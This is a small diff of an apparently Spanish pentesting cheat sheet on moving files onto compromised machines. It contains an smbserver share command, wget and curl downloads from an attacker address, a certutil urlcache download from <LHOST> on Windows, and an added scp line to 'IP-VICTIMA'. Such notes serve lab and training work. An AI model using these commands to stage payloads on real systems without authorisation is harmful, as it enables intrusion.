@@ -33,7 +33,8 @@ sudo python smbserver.py [como se llamará el recurso a compartir] [nombre del r
 
      Target Linux: 
          wget http://[IP]/recurso
-         
+         scp archivo usuario@IP-VICTIMA:/home
+
      Target Windows:
          curl -O http://[IP]/recurso
          certutil.exe -f -urlcache -split "http://<LHOST>/<FILE>" <FILE>
